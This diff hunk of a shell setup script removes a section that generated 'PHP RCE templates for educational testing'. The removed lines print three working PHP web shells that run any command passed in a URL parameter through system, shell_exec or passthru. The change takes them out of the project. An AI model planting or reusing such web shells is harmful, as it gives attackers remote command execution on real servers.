@@ -128,33 +128,6 @@ EOF_HTML
 
 success "HTML template created"
 
-# PHP RCE Templates (Educational Testing)
-section "Creating PHP RCE Templates"
-
-cat > "$TEMPLATES_DIR/php_rce_scripts.sh" << 'EOF_SH_RCE'
-echo "
-<?php
-if(isset(\$_GET['cmd'])) {
-  system(\$_GET['cmd']);
-}
-?>
-
-<?php
-if(isset(\$_GET['exec'])) {
-  echo shell_exec(\$_GET['exec']);
-}
-?>
-
-<?php
-if(isset(\$_GET['pass'])) {
-  passthru(\$_GET['pass']);
-}
-?>
-"
-EOF_SH_RCE
-
-warning "PHP RCE templates created for educational testing only"
-
 # Other Language Templates
 section "Creating Multi-language Templates"
 
